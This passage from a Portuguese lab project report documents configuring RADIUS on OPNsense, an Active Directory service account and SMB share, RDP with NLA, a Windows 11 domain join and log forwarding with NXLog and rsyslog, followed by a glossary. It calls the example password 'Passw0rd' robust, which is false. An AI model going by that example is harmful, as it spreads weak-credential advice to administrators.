-   **Password:** Credencial correspondente no Active Directory.

-   **Ação:** Clique em **Test**.

![](./images/media/image419.png)

![](./images/media/image420.png)

*Figura 363 - Configuração do servidor de autenticação RADIUS na
OPNsense, com destaque para o endereço IP do controlador de domínio e a
ativação da sincronização de grupos.*

![](./images/media/image421.png)

*Figura 364 - Listagem dos servidores de autenticação na OPNsense,
destacando o servidor RADIUS (WinServer_RADIUS) configurado com o
endereço IP 172.30.50.98.*

![](./images/media/image422.png)

*Figura 365 - Criação do grupo \"ITGeral\" na OPNsense e atribuição de
privilégios de administração total (All pages) para utilizadores
autenticados via RADIUS.*

![](./images/media/image423.png)

*Figura 366 - Sucesso no teste de autenticação RADIUS (System: Access:
Tester), confirmando a receção do atributo Class e a correta validação
das credenciais do utilizador plinha pelo Windows Server.*

##### Configuração do Método de Autenticação Global

Após o registo do servidor e o mapeamento de grupos, é necessário
instruir o sistema operativo da firewall a utilizar o RADIUS como método
de autenticação para o acesso à interface de gestão:

-   **Caminho:** **System** à **Settings** à **Administration**.

-   **Secção de Autenticação:** Localização do campo **Authentication
    Server**.

-   **Seleção de Servidores:** Seleção conjunta (via CTRL) de **Local
    Database** e **WinServer_RADIUS**.

    -   *Nota Estratégica:* A manutenção da base de dados local como
        primeiro método garante o acesso de emergência à firewall em
        caso de indisponibilidade do Controlador de Domínio ou falha na
        rede.

-   **Finalização:** Clique em **Save** para aplicar as novas políticas
    de login ao sistema.

![](./images/media/image424.png)

*Figura 367 - Configuração da hierarquia de autenticação na OPNsense,
integrando o servidor RADIUS como método de validação para o acesso
administrativo.*

## Configuração de Recursos Partilhados no Windows Server

Antes da disponibilização do recurso partilhado (*Share*), procedeu-se à
criação de uma conta de serviço dedicada para garantir o isolamento e a
segurança dos acessos.

**1. Criação de Utilizador no Active Directory:**\
A organização dos objetos no domínio seguiu as boas práticas de gestão
por Unidades Organizacionais:

-   **Acesso:** **Active Directory Users and Computers**.

-   **Estrutura:** Botão direito no domínio à **New** 

![](./images/media/image344.gif)

 **Organizational Unit** (Nome: Admin).

-   **Objeto Utilizador:** Dentro da OU Admin, botão direito à **New** à
    **User**.

    -   **Full Name:** User Scanner.

    -   **User logon name:** user_scanner.

    -   **Password:** Definição de uma credencial robusta
        (ex: Passw0rd).

    -   *Nota:* A conta foi mantida no grupo predefinido Domain Users,
        seguindo o princípio do privilégio mínimo.

**2. Gestão de Permissões para Depósito de Relatórios:**\
Para que esta conta de serviço possa gravar ficheiros na pasta
partilhada, a atribuição de privilégios será feita em dois níveis:

-   **Permissões de Partilha (Share Permissions):** Atribuição de
    permissão de leitura/escrita ao utilizador user_scanner.

-   **Permissões de Sistema de Ficheiros (NTFS):** Configuração de
    permissões de **Modify** e **Write** na pasta local, garantindo que
    o serviço de scanning pode criar e editar relatórios, mas sem
    comprometer a integridade de outras áreas do servidor.

![](./images/media/image425.png)

*Figura 368 - Consola do Active Directory exibindo a Unidade
Organizacional \"Admin\" e a conta de serviço \"user scanner\"
devidamente criada.*

**Criação do Diretório Local e Partilha de Rede**

Para servir de repositório centralizado para os ficheiros de auditoria,
procedeu-se à criação de uma pasta física no volume de sistema do
servidor:

-   **Caminho Local:** Acesso ao **File Explorer** 

![](./images/media/image344.gif)

 **Disco Local (C:)**.

-   **Ação:** Criação do diretório Relatorios_Vuln, destinado
    exclusivamente ao armazenamento de relatórios de vulnerabilidades.

-   **Objetivo:** Estabelecer a base para a posterior configuração de
    permissões de partilha e segurança NTFS.

![](./images/media/image426.png)

*Figura 369 - Criação da pasta \"Relatorios_Vuln\" na raiz do Disco
Local (C:) do Windows Server para servir como repositório de rede.*

##### Configuração de Partilha Avançada e Permissões de Rede

Para disponibilizar a pasta na rede interna de forma segura, procedeu-se
à configuração da partilha avançada, restringindo o acesso
exclusivamente à conta de serviço criada:

-   **Acesso à Partilha:** No menu de propriedades, seleção do
    separador **Sharing** 

![](./images/media/image344.gif)

 **Advanced Sharing**.

-   **Ativação do Recurso:** Ativação da opção **Share this folder**,
    definindo o nome de partilha na rede.

-   **Gestão de Permissões de Partilha:** Clique em **Permissions** para
    o ajuste fino dos acessos:

    1.  **Segregação de Acessos:** Remoção do grupo
        genérico **\"Everyone\"**, eliminando o acesso público ao
        recurso.

    2.  **Identificação do Objeto:** Adição específica do
        utilizador **user_scanner** proveniente do Active Directory.

    3.  **Atribuição de Privilégios:** Definição das permissões
        de **Change** e **Read**, garantindo que o serviço de scanning
        pode depositar e editar ficheiros, mas sem autorização para
        alterar as permissões da própria pasta.

-   **Finalização:** Clique em **OK** em ambas as janelas para validar e
    propagar as definições de partilha.

![](./images/media/image427.png)

*Figura 370 - Acesso ao menu de propriedades da pasta
\"Relatorios_Vuln\" para configurar os níveis de partilha e segurança
NTFS.*

![](./images/media/image428.png)

*Figura 371 - Acesso às definições de \"Advanced Sharing\" para
configurar a partilha personalizada do diretório no Windows Server.*

![](./images/media/image429.png)

*Figura 372 - Ativação da partilha avançada para a pasta
\"Relatorios_Vuln\" e acesso ao menu de definição de permissões de
rede.*

![](./images/media/image430.png)

*Figura 373 - Configuração restritiva de permissões de partilha (Share
Permissions), atribuindo privilégios de \"Change\" e \"Read\"
exclusivamente ao utilizador de serviço user_scanner.*

##### Configuração de Permissões de Segurança (NTFS)

Para garantir que o serviço de scanning consegue efetivamente escrever
no disco rígido do servidor, é imperativo configurar as permissões ao
nível do sistema de ficheiros (**NTFS**). Sem este passo, o acesso será
negado, mesmo que as permissões de partilha estejam corretas:

-   **Acesso:** Nas propriedades da pasta Relatorios_Vuln, seleção do
    separador **Security**.

-   **Modificação:** Clique no botão **Edit** para aceder à gestão da
    Lista de Controlo de Acesso (**ACL**).

-   **Adição de Objeto:** Clique em **Add** para selecionar o utilizador
    de serviço **user_scanner** a partir do Active Directory.

-   **Atribuição de Privilégios:** Definição das permissões
    de **Modify** e **Write**, assegurando a capacidade de criação e
    edição de ficheiros no diretório.

![](./images/media/image431.png)

*Figura 374 - Acesso ao menu de edição de permissões NTFS para garantir
privilégios de escrita local ao utilizador de serviço.*

![](./images/media/image432.png)

*Figura 375 - Acesso ao menu de edição de permissões NTFS para a
inclusão do utilizador de serviço na Lista de Controlo de Acesso (ACL).*

##### Atribuição de Privilégios NTFS ao Utilizador de Serviço

Para assegurar que o utilizador do domínio tem os direitos necessários
para operar sobre o sistema de ficheiros local, completou-se a
configuração da seguinte forma:

-   **Identificação do Objeto:** Introdução do nome user_scanner e
    validação no Active Directory via botão **OK**.

-   **Definição de Permissões:** Atribuição dos privilégios
    de **Modify**, **Read & execute**, **List folder
    contents**, **Read** e **Write**.

    -   *Nota Técnica:* A permissão de **Modify** é essencial, pois
        permite ao serviço de scanning não só criar novos relatórios,
        como também atualizar ficheiros já existentes.

-   **Finalização:** Clique em **Apply** e **OK** para propagar as
    listas de controlo de acesso (ACL) a todos os subdiretórios e
    ficheiros.

![](./images/media/image433.png)

*Figura 376 - Atribuição final de permissões NTFS ao utilizador
user_scanner, garantindo o nível de acesso \"Modify\" para a escrita e
edição de relatórios no servidor.*

##### Ajuste de Diretivas de Firewall (Tráfego SMB)

Para garantir que o repositório de relatórios está acessível através da
rede, é necessário configurar a firewall do Windows para permitir as
ligações de entrada relacionadas com o serviço de ficheiros:

-   **Acesso à Configuração:** No **Server Manager**, seleção
    de **Tools** 

![](./images/media/image344.gif)

 **Windows Defender Firewall with Advanced Security**.

-   **Regras de Entrada (Inbound Rules):** Localização e ativação da
    regra predefinida **File and Printer Sharing (SMB-In)**.

-   **Objetivo:** Libertar a comunicação na **porta 445 (TCP)**,
    permitindo que o serviço de scanning deposite os ficheiros no
    servidor de forma remota e segura.

![](./images/media/image434.png)

*Figura 377 - Acesso às definições avançadas da Firewall do Windows
Server para a configuração de regras de entrada de partilha de
ficheiros.*

![](./images/media/image435.png)

*Figura 378 - Ativação da regra de entrada \"File and Printer Sharing
(SMB-In)\" na Firewall do Windows Server, autorizando a comunicação na
porta 445.*

## Ativação do Protocolo de Ambiente de Trabalho Remoto (RDP)

Para viabilizar a gestão remota do **Windows Server** a partir de outros
postos de trabalho da rede, procedeu-se à ativação do serviço
de **Remote Desktop**:

-   **Caminho:** **Control Panel** à **System and Security** à
    **System**.

-   **Configuração:** Seleção da opção **Allow remote access**.

-   **Objetivo:** Permitir ligações de entrada seguras, facilitando a
    administração centralizada do servidor através do protocolo RDP
    (porta 3389).

![](./images/media/image436.png)

*Figura 379 - Acesso às definições de sistema no Painel de Controlo para
a ativação das permissões de acesso remoto ao servidor.*

**Configuração Avançada de Remote Desktop**

Na janela de **System Properties**, foram definidas as seguintes
políticas de segurança para o acesso remoto:

-   **Ativação do Serviço:** Seleção de **Allow remote connections to
    this computer** para disponibilizar o serviço RDP.

-   **Reforço de Segurança (NLA):** Ativação da opção **Allow
    connections only from computers running Remote Desktop with Network
    Level Authentication (recommended)**.

    -   *Nota Técnica:* A ativação do **NLA** exige que o utilizador se
        autentique antes de a sessão RDP ser estabelecida, protegendo o
        servidor contra ataques de negação de serviço (DoS) e ataques de
        força bruta.

-   **Finalização:** Clique em **Apply** para aplicar as novas
    definições de segurança ao sistema.

![](./images/media/image437.png)

*Figura 380 - Ativação do acesso remoto no Windows Server com reforço de
segurança através de Autenticação ao Nível da Rede (NLA).*

##### Configuração de Direitos de Acesso RDP via Group Policy

Nos Controladores de Domínio, a autorização para ligações remotas é
gerida de forma rigorosa através de diretivas de segurança. Para
permitir o acesso da equipa técnica, procedeu-se à seguinte
configuração:

-   **Acesso à Consola:** Execução do comando gpedit.msc para abrir
    o **Editor de Política de Grupo Local**.

-   **Caminho de Configuração:** **Computer Configuration** à **Windows
    Settings** à **Security Settings** à **Local Policies** à **User
    Rights Assignment**.

-   **Definição de Política:** Localização e abertura da
    diretiva **\"Allow log on through Remote Desktop Services\"**.

-   **Atribuição de Permissões:**

    -   Clique em **Add User or Group**.

    -   Inclusão do grupo de segurança do domínio: AntMarMat\\ITGeral.

-   **Aplicação:** Clique em **Apply** e **OK** para atualizar as
    permissões de logon remoto no servidor.

![](./images/media/image438.png)

*Figura 381 - Edição da política \"Allow log on through Remote Desktop
Services\" no Editor de Política de Grupo Local para autorizar o acesso
remoto do grupo ITGeral.*

![](./images/media/image439.png)

*Figura 382 - Acesso às definições da diretiva \"Allow log on through
Remote Desktop Services\" para a adição do grupo de segurança ITGeral.*

![](./images/media/image440.png)

*Figura 383 - Seleção e validação do grupo de segurança \"ITGeral\" do
domínio AntMarMat para atribuição de direitos de logon remoto via RDP.*

![](./images/media/image441.png)

*Figura 384 - Validação da diretiva de segurança com o grupo
\"ANTMARMAT\\ITGeral\" devidamente adicionado à lista de permissões para
logon via Remote Desktop Services.*

## Conclusão da Configuração do Windows Server (DC)

A implementação do **Windows Server 2022** como Controlador de Domínio
(**AD DS**) estabeleceu o núcleo de gestão e segurança de toda a
infraestrutura. Através da centralização de identidades e da aplicação
de **Políticas de Grupo (GPOs)**, garantiu-se um controlo rigoroso sobre
os postos de trabalho da **Zona Green**, desde a restrição de acessos
locais até à gestão centralizada da firewall.

A configuração de serviços críticos, como o **NPS/RADIUS**, permitiu
estender a segurança do Active Directory a outros componentes da rede,
como a autenticação da **OpenVPN** e o acesso administrativo
à **OPNsense**. Adicionalmente, a disponibilização de recursos
partilhados com permissões **NTFS** granulares e a ativação
do **RDP** seguro (NLA) para a equipa de **IT**, asseguraram um ambiente
operacional eficiente, auditável e preparado para suportar os requisitos
de conformidade e administração remota definidos no projeto.

# 

## Implementação do Cliente Windows 11 (Zona Green)

**Introdução**\
A instalação do **Windows 11** na zona **Green** (rede interna
protegida) visa estabelecer o posto de trabalho padrão para os
utilizadores da organização. Esta máquina atua como o
principal *endpoint* para a validação das configurações de rede e
segurança impostas pelo Controlador de Domínio, permitindo testar a
eficácia das **GPOs**, a receção de endereçamento via **DHCP** e a
conectividade segura aos recursos partilhados e serviços de impressão
do **Windows Server**.

![](./images/media/image442.png)

*Figura 385 - Início do processo de instalação do Windows 11 Pro, com a
definição regional para Português (Portugal) e idioma de sistema em
Inglês.*

![](./images/media/image443.png)

*Figura 386 - Configuração do esquema de teclado para Português durante
o processo de instalação do Windows 11 na Zona Green.*

![](./images/media/image444.png)

*Figura 387 - Seleção da opção de instalação completa do Windows 11,
assegurando a remoção de configurações anteriores para uma implementação
limpa na Zona Green.*

![](./images/media/image445.png)

*Figura 388 - Fase de ativação do Windows 11, com a seleção da opção de
instalação sem chave de produto para fins de demonstração em ambiente de
laboratório.*

![](./images/media/image446.png)

*Figura 389 - Seleção da versão Windows 11 Pro, requisito essencial para
a futura integração da máquina no domínio do Windows Server.*

![](./images/media/image447.png)

*Figura 390 - Aceitação dos termos de licenciamento e avisos aplicáveis
para o sistema operativo Windows 11.*

![](./images/media/image448.png)

*Figura 391 - Seleção da unidade de disco virtual (64 GB) para a
instalação do Windows 11, utilizando o espaço não alocado para uma
configuração automática de partições.*

![](./images/media/image449.png)

*Figura 392 - Resumo das definições de instalação (\"Ready to
install\"), confirmando a edição Windows 11 Pro e a opção de limpeza
total de dados.*

![](./images/media/image450.png)

*Figura 393 - Ecrã de boas-vindas do Windows 11 após a instalação, com a
seleção da região (Portugal) para a configuração de definições locais.*

![](./images/media/image451.png)

*Figura 394 - Seleção do esquema de teclado \"Portuguese\", assegurando
a compatibilidade com o hardware utilizado na Zona Green.*

![](./images/media/image452.png)

*Figura 395 - Verificação da conectividade de rede (\"Network
Connected\") no Windows 11, confirmando a deteção da placa de rede
virtual e o acesso à infraestrutura.*

![](./images/media/image453.png)

*Figura 396 - Atribuição do nome de anfitrião (Hostname) W11-GREEN-01
para facilitar a identificação e gestão do dispositivo no domínio.*

![](./images/media/image454.png)

*Figura 397 - Seleção do tipo de configuração para fins profissionais
(\"Set up for work or school\"), passo determinante para a futura junção
ao domínio do Windows Server.*

![](./images/media/image455.png)

*Figura 398 - Fase de configuração de segurança do Windows Hello,
procedendo à criação de um código PIN para o início de sessão no
dispositivo.*

![](./images/media/image456.png)

*Figura 399 - Ambiente de trabalho do Windows 11 após a instalação, com
o início automático da implementação das VMware Tools para otimização de
performance e integração com o anfitrião.*

![](./images/media/image457.png)

*Figura 400 - Configuração das VMware Tools no Windows 11, selecionando
o tipo de instalação \"Typical\" para otimizar a interação entre o
hardware virtual e o sistema operativo.*

![](./images/media/image458.png)

*Figura 401 - Início do processo de escrita e instalação das VMware
Tools no Windows 11 para otimização da placa de rede e do controlador
gráfico.*

![](./images/media/image459.png)

*Figura 402 - Validação do endereçamento IP na Zona Green e teste de
conectividade (ping) com sucesso ao Controlador de Domínio
(172.30.50.98).*

![](./images/media/image460.png)

*Figura 403 - Configuração de rede no Windows 11 com atribuição dinâmica
de IP via DHCP e definição manual do servidor DNS (172.30.50.98),
apontando para o IP do Windows Server (ADDS).*

No terminal (PowerShell), o comando ipconfig confirma que a máquina
recebeu o IP 172.30.50.99 e o sufixo DNS AntMarMat.win. Agora que a rede
está pronta, o passo seguinte é a **junção efetiva da máquina ao
domínio**.

##### Integração da Estação de Trabalho no Domínio (Domain Join)

Após a validação da conectividade e da resolução de nomes (DNS),
procedeu-se à integração efetiva do cliente Windows 11 no
domínio **AntMarMat.win**:

-   **Acesso às Definições:** **Settings** à **System** à **About**.

-   **Configuração Avançada:** Seleção da opção **Advanced system
    settings**, localizada na secção de especificações do dispositivo.

-   **Objetivo:** Aceder à interface de alteração de nome e domínio para
    vincular a máquina à infraestrutura centralizada do Windows Server.

![](./images/media/image461.png)

*Figura 404 - Navegação no menu de sistema do Windows 11 para aceder às
definições avançadas e iniciar o processo de junção ao domínio.*

![](./images/media/image462.png)

*Figura 405 - Acesso às Definições de Sistema Avançadas (Advanced system
settings) no Windows 11 para a configuração do nome de anfitrião e
junção ao domínio.*

**Processo de Junção ao Domínio (Domain Join)**

Após a validação da resolução de nomes, procedeu-se à vinculação da
estação de trabalho ao domínio corporativo:

-   **Configuração de Nome:** Na janela **System Properties** à
    separador **Computer Name** à clique em **Change**.

-   **Identificação do Domínio:** Seleção da opção **Domain** à
    introdução do domínio AntMarMat.win.

-   **Autenticação de Segurança:** No ecrã de credenciais, utilizou-se
    uma conta com privilégios de administração de domínio para autorizar
    a junção (ex: plinha@AntMarMat.win).

-   **Conclusão:** Aceitação da mensagem de boas-vindas ao domínio à
    **OK**.

-   **Finalização:** Reinício obrigatório do sistema operativo para
    aplicação das novas diretivas de rede e segurança.

![](./images/media/image463.png)

*Figura 406 - Acesso à interface de alteração de domínio no Windows 11
para iniciar a vinculação da máquina à infraestrutura AntMarMat.win.*

![](./images/media/image464.png)

*Figura 407 - Configuração do domínio \"AntMarMat.win\" na janela de
alterações de nome e domínio (Computer Name/Domain Changes) no Windows
11.*

![](./images/media/image465.png)

*Figura 408 - Autenticação no domínio utilizando a conta de serviço
plinha@AntMarMat.win para autorizar a junção do cliente Windows 11 à
infraestrutura centralizada.*

![](./images/media/image466.png)

*Figura 409 - Mensagem de confirmação \"Welcome to the AntMarMat.win
domain\", validando a correta integração e reconhecimento do cliente
Windows 11 no domínio.*

![](./images/media/image467.png)

*Figura 410 - Interface de início de sessão no Windows 11, confirmando a
autenticação do utilizador plinha no domínio corporativo ANTMARMAT.*

![](./images/media/image468.png)

*Figura 411 - Verificação das informações da conta no Windows 11,
confirmando o início de sessão bem-sucedido com o utilizador do domínio
\"Pedro Linha\" (ANTMARMAT\\plinha).*

##### Gestão de Objetos de Computador no Active Directory

Após a integração bem-sucedida do cliente Windows 11, procedeu-se à
organização do novo objeto no **Active Directory** para garantir a
correta aplicação das diretivas de segurança:

-   **Localização Inicial:** Acesso à consola **Active Directory Users
    and Computers** (dsa.msc), onde o objeto WINCLIENT foi
    automaticamente registado no contentor predefinido **Computers**.

-   **Organização Estrutural:** Movimentação do objeto de computador
    para a **Unidade Organizacional (OU)** correspondente à sua
    localização física e funcional (ex: **Norte à IT**).

-   **Objetivo:** Esta relocalização é crítica para que o computador
    herde as **GPOs** vinculadas a essa OU, tais como as políticas de
    restrição de logon e as definições centralizadas da firewall.

![](./images/media/image469.png)

*Figura 412 - Visualização do objeto de computador WINCLIENT no Active
Directory, confirmando o registo bem-sucedido da máquina no domínio
AntMarMat.win.*

![](./images/media/image470.png)

*Figura 413 - Confirmação da relocalização do objeto de computador
WINCLIENT para a Unidade Organizacional (OU) de destino, garantindo a
herança das GPOs de segurança.*

![](./images/media/image471.png)

*Figura 414 - Visualização da Unidade Organizacional (OU) \"IT\" no
domínio, contendo o utilizador \"Pedro Linha\" e o computador
\"WINCLIENT\" devidamente agrupados para a aplicação das diretivas de
segurança.*

![](./images/media/image472.png)

![](./images/media/image473.png)

![](./images/media/image474.png)

*Figura 415 - Testes de conectividade (ping) a partir do Windows 11
(Zona Green), validando com sucesso a comunicação com o Gateway
(172.30.50.97), o servidor da Zona DMZ (10.30.50.129) e a saída para a
Internet (DNS 8.8.8.8 e 1.1.1.1).*

## Conclusão da Configuração do Windows 11 (Zona Green)

A implementação e integração do **Windows 11** no
domínio **AntMarMat.win** permitiu validar, na prática, a eficácia de
toda a arquitetura de rede e segurança previamente configurada. A
receção bem-sucedida do endereçamento via **DHCP**, aliada à correta
resolução de nomes através do **DNS** do Windows Server, assegurou a
conectividade total da estação de trabalho, tanto para a comunicação
interna entre sub-redes (Green DMZ) como para o acesso controlado à
Internet.

Desta forma, o cliente Windows 11 assume-se como o recetáculo final das
políticas de grupo (**GPOs**) e das regras de firewall estabelecidas no
Controlador de Domínio, confirmando que as permissões de utilizador e as
restrições de segurança estão a ser aplicadas de forma uniforme e
conforme o planeado na infraestrutura organizacional.

# 

## Implementação do Agente NXLog no Windows Server Core

Para viabilizar a recolha e o encaminhamento de eventos do sistema para
um servidor de logs centralizado, procedeu-se à instalação do
agente **NXLog**. Dada a natureza do servidor de destino (**Windows
Server Core**), a transferência do pacote de instalação foi realizada
via rede, utilizando protocolos de comunicação segura:

-   **Método de Transferência:** Utilização do
    utilitário **SCP** (*Secure Copy*) a partir da estação de trabalho
    Windows 11.

-   **Procedimento:** Execução do comando para copiar o
    instalador .msi do diretório local para a raiz do disco C: do
    servidor remoto (IP 192.168.150.243).

-   **Segurança:** Validação da identidade do anfitrião remoto através
    da *fingerprint* SSH e autenticação com credenciais de
    administrador.

![](./images/media/image475.png)

*Figura 416 - Transferência segura do instalador do NXLog via SCP,
demonstrando a validação da chave SSH e o sucesso na cópia do ficheiro
para o servidor remoto.*

Nesta fase, **preparou-se** o servidor para administração remota
e **iniciou-se** a monitorização centralizada de logs:

-   **Instalação do Servidor SSH:**\
    **Utilizou-se** o comando Add-WindowsCapability para instalar
    o **OpenSSH Server**. Esta ação **permitiu** gerir o servidor
    Windows Core remotamente via linha de comando.

-   **Configuração do Serviço SSH:**

    -   **Iniciou-se** o serviço (Start-Service sshd).

    -   **Configurou-se** o arranque para **Automático** (Set-Service
        -StartupType Automatic), garantindo a persistência do acesso
        após reinícios.

-   **Instalação do Agente NXLog:**\
    **Executou-se** o instalador nxlog-6.12.10584_windows_x64.msi em
    modo silencioso (/quiet). Este passo **assegurou** a base para o
    envio de logs do sistema, IIS e Base de Dados para a VenusSuf.

-   **Verificação do Estado:**\
    **Validou-se** que o serviço **nxlog** ficou corretamente em
    execução (Running) através do comando Get-Service nxlog.

![](./images/media/image476.png)

*Figura 417 - Instalação silenciosa do NXLog via linha de comandos
(msiexec) e validação do estado do serviço como \"Running\" no servidor
remoto.*

Nesta etapa, **configurou-se** o agente NXLog para a recolha e o
reencaminhamento de logs:

-   **Definição de Caminhos:** **Estabeleceram-se** as diretorias base
    do programa, módulos e ficheiros de log locais.

-   **Recolha de Eventos (Input):** **Configurou-se** o
    módulo im_msvistalog para capturar eventos críticos do Windows,
    especificamente as categorias de **Segurança (Security)**, **Sistema
    (System)** e **Aplicação (Application)**.

-   **Destino dos Logs (Output):** **Definiu-se** o envio dos dados via
    protocolo **UDP** para o servidor de logs central
    (IP: 172.20.50.194) na porta **514**, utilizando o
    formato syslog_bsd.

-   **Encaminhamento (Route):** **Criou-se** a rota lógica que liga a
    entrada dos eventos (eventlog) à saída configurada (syslog_out),
    assegurando o fluxo contínuo de informação para a zona VenusSuf.

![](./images/media/image477.png)

*Figura 418 - Configuração do ficheiro nxlog.conf no Windows Server
Core.*

# 

##  Configuração do Serviço Rsyslog no WAF (Debian)

Nesta fase, **implementou-se** a centralização de eventos do servidor
WAF (*Web Application Firewall*), de forma a garantir a rastreabilidade
de acessos e tentativas de intrusão. Para tal, **utilizou-se** o
serviço **rsyslog** para o reencaminhamento de logs críticos da
rede **MarteSuf** para o servidor de gestão central (Syslog-ng)
localizado na zona **VenusSuf**.

![](./images/media/image478.png)

*Figura 419 - Configuração e teste de reencaminhamento de logs no
servidor WAF.*

No terminal apresentado, **realizaram-se** os seguintes procedimentos
técnicos:

-   **Acesso Remoto:** **Efetuou-se** a ligação via SSH ao servidor
    Debian (WAF-AMM) para administração segura.

-   **Privilégios de Administração:** **Obteve-se** acesso de
    superutilizador (*root*) para a modificação de ficheiros de sistema,
    após tentativas iniciais de permissão negada.

-   **Configuração de Reencaminhamento:** **Adicionou-se** a regra de
    saída no ficheiro /etc/rsyslog.conf, direcionando todos os logs para
    o coletor central (IP: 172.20.50.194) através do protocolo UDP na
    porta 514.

-   **Aplicação de Alterações:** **Reiniciou-se** o
    serviço rsyslog através do comando systemctl restart para validar a
    nova configuração.

-   **Teste de Conetividade:** **Executou-se** o utilitário logger para
    gerar mensagens de teste (\"teste syslog waf\"), confirmando o envio
    bem-sucedido dos eventos para o servidor remoto.

######## Glossário 

**A**

**ACL** *(Access Control List)* --- Lista de regras que permitem ou
negam tráfego de rede com base em critérios como endereço IP de
origem/destino, porto e protocolo. No Router Cisco, a ACL 1 controla
quais as redes que podem fazer NAT, e a ACL 10 restringe o acesso SSH à
VLAN de gestão.

**Active Directory (AD)** --- Serviço de diretório da Microsoft que
centraliza a autenticação e gestão de utilizadores, computadores e
grupos numa rede Windows. No projeto, está instalado no Windows Server
2022 da zona Green MarteSuf, sob o domínio *AntMarMat.win*.

**Apache** --- Servidor web open-source instalado no servidor CentOS da
zona Orange VenusSuf, responsável por servir os três sites configurados
no projeto.

**B**

**Brute Force** --- Técnica de ataque que consiste em tentar
sistematicamente todas as combinações possíveis de credenciais até
encontrar a correta. No projeto, é simulada com a ferramenta Hydra
contra o site com autenticação da zona Orange VenusSuf.

**C**

**CentOS** --- Distribuição Linux baseada em Red Hat Enterprise Linux,
utilizada como servidor web na zona Orange VenusSuf. O servidor foi
fornecido propositadamente desatualizado (novembro de 2019) para servir
de alvo de análise de vulnerabilidades.

**Certificado Self-Signed** --- Certificado SSL/TLS assinado pelo
próprio servidor, sem intervenção de uma Autoridade de Certificação
reconhecida. Garante a encriptação do canal mas o browser apresenta um
aviso de segurança. Utilizado no site HTTPS do servidor CentOS.

**ChaCha20** --- Algoritmo de cifra simétrica utilizado pelo protocolo
Wireguard para encriptação do túnel VPN. Mais eficiente que o AES em
dispositivos sem aceleração de hardware.

**Cisco IOS** --- Sistema operativo dos equipamentos Cisco, incluindo o
Router 4300 utilizado no projeto. Responsável pelo routing, NAT, DHCP,
ACLs e SSH da infraestrutura física.

**CVE** *(Common Vulnerabilities and Exposures)* --- Sistema de
identificação pública de vulnerabilidades de segurança conhecidas. Cada
CVE tem um identificador único e um score de severidade (CVSS). O
OpenVAS/Nessus identifica CVEs nas VMs analisadas.

**CVSS** *(Common Vulnerability Scoring System)* --- Sistema de
pontuação que classifica a severidade de vulnerabilidades numa escala de
0 a 10. Utilizado nos relatórios do OpenVAS/Nessus para priorizar as
vulnerabilidades encontradas.

**D**

**DC** *(Domain Controller)* --- Servidor que aloja e gere o Active
Directory. No projeto, o Windows Server 2022 da zona Green MarteSuf
desempenha este papel, sendo responsável pela autenticação de todos os
utilizadores do domínio *AntMarMat.win*.

**Defense in Depth** --- Estratégia de segurança que implementa
múltiplas camadas de proteção independentes. No projeto: Router →
Firewall → IDS/IPS → WAF → SIEM. A comprometição de uma camada não
implica o acesso imediato às restantes.

**DHCP** *(Dynamic Host Configuration Protocol)* --- Protocolo que
atribui automaticamente configurações de rede aos clientes, incluindo
endereço IP, máscara de sub-rede, gateway e DNS. No projeto, o router
Cisco serve DHCP para a VLAN 10 (Red) e o Windows Server 2022 serve DHCP
para a zona Green MarteSuf.

**DMZ** *(Demilitarized Zone)* --- Zona de rede intermédia entre a
internet e a rede interna, destinada a albergar serviços acessíveis
publicamente. No projeto, corresponde às zonas Orange de ambos os
firewalls.

**DNS** *(Domain Name System)* --- Sistema que traduz nomes de domínio
em endereços IP. No projeto, o Windows Server 2022 atua como servidor
DNS para a zona Green MarteSuf e para os clientes da VPN OpenVPN.

**DOS** *(Denial of Service)* --- Ataque que visa tornar um serviço ou
sistema indisponível através da sobrecarga com tráfego malicioso. No
projeto, é simulado com as ferramentas hping3 a partir do Kali Linux,
sendo detetado pelo Snort e Suricata e bloqueado via Wazuh.

**E**

**Encapsulation dot1Q** --- Comando Cisco IOS que define o protocolo
IEEE 802.1Q numa sub-interface, associando-a a uma VLAN específica.
Fundamental para o funcionamento do modelo Router-on-a-Stick.

**F**

**Firewall** --- Sistema que controla o tráfego de rede com base em
regras predefinidas. No projeto, são utilizadas duas firewalls: pfSense
(VenusSuf) e OPNsense (MarteSuf), ambas com política de negação por
defeito (*deny-by-default*).

**Full Tunnel** --- Configuração VPN em que todo o tráfego do cliente,
incluindo o acesso à internet, é encaminhado através do túnel. No
projeto, aplicado às VPNs Wireguard e OpenVPN --- quando ativas, o
tráfego de internet do Windows passa pelo respetivo firewall.

**FQDN** *(Fully Qualified Domain Name)* --- Nome de domínio completo
que identifica inequivocamente um host na rede, composto pelo hostname e
pelo domínio. Exemplo: *winserver.AntMarMat.win*. Necessário para a
geração de chaves RSA no SSH do router Cisco.

**G**

**Gateway** --- Dispositivo que serve de ponto de saída de uma rede para
outras redes. No projeto, o router Cisco é o gateway de todas as VLANs
para a internet, e cada firewall é o gateway das suas zonas Orange e
Green.

**GPO** *(Group Policy Object)* --- Conjunto de políticas de
configuração aplicadas centralmente a utilizadores e computadores no
domínio Active Directory. Permite definir políticas de password,
restrições de software e configurações de segurança.

**Grafana** --- Plataforma open-source de visualização e análise de
dados. No projeto, é utilizada em conjunto com o Loki para criar
dashboards de monitorização e pesquisa de logs em tempo real.

**H**

**hping3** --- Ferramenta de linha de comando para geração de pacotes
TCP/IP personalizados. No projeto, é utilizada pelo Kali Linux para
simular ataques DOS e SYN flood contra as interfaces WAN dos firewalls.

**HTTP Basic Auth** --- Mecanismo nativo de autenticação HTTP em que as
credenciais são enviadas em Base64 no cabeçalho do pedido. Utilizado no
segundo site do servidor CentOS da zona Orange VenusSuf.

**Hydra** --- Ferramenta de brute force para ataques a serviços de
autenticação, incluindo HTTP, SSH e FTP. No projeto, é utilizada pelo
Kali Linux para testar a robustez das passwords do site com autenticação
do CentOS.

**I**

**IDS** *(Intrusion Detection System)* --- Sistema que monitoriza o
tráfego de rede e gera alertas quando deteta atividade suspeita, sem
interferir no tráfego. No projeto, o Snort (VenusSuf) e o Suricata
(MarteSuf) funcionam em modo IDS, com resposta ativa delegada ao Wazuh.

**IKEv2** *(Internet Key Exchange version 2)* --- Protocolo de
negociação de chaves utilizado pelo IPSec para estabelecer e manter
associações de segurança. Utilizado na VPN site-to-site entre VenusSuf e
MarteSuf.

**IPS** *(Intrusion Prevention System)* --- Sistema que deteta e
bloqueia tráfego suspeito de forma inline. Difere do IDS por intervir
diretamente no fluxo de tráfego, em vez de apenas alertar.

**IPSec** --- Suite de protocolos para encriptação e autenticação de
tráfego ao nível IP. No projeto, utilizado para a VPN site-to-site entre
as firewalls VenusSuf e MarteSuf, com algoritmos AES-256, SHA-256 e DH
Group 14.

